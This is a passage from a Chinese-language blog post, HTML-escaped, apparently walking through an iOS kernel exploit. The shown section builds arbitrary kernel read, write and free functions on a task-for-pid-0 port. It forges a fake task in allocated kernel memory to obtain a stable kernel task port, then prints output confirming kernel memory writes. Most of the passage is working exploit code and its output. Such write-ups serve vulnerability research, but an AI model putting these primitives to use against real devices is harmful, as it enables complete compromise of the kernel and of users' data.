    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_vm_read_overwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;写函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wk32()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wk64()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wk32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_vm_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;内存释放函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kfree()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_vm_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;9-稳定的tfp0&quot;&gt;9. 稳定的TFP0&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new_tfp0&lt;/code&gt;是我们最终要使用的TFP0，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_port()&lt;/code&gt;也是利用上面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tfpzero&lt;/code&gt;进行读取&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tfp0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最开始分析代码的时候我们说过所有的Port都以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry_t&lt;/code&gt;的形式存在在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_table&lt;/code&gt;里，可以通过用户态Port来计算索引取出这个Port的内核态地址&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_self&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itk_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_ITK_SPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 取索引&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof_ipc_entry_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof_ipc_entry_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重新申请一片内核内存用于存储&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task&lt;/code&gt;，通过函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kwrite()&lt;/code&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fake_task&lt;/code&gt;写到新申请的内核内存空间，然后让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip_kobject&lt;/code&gt;指向这片新的内存，最后通过刷新&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new_addr&lt;/code&gt;指向的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new_tfp0&lt;/code&gt;内存来获取一个最终的TFP0&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重复一遍上面的写入读取，测试这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new_tfp0&lt;/code&gt;是否可用&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;init_kernel_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] tfp0: 0x%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] allocated: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;wk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;readb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] read back: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;效果蛮好&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] tfp0: 0x6203
[*] allocated: 0xfffffff008e1f000
[*] read back: 0x4141414141414141
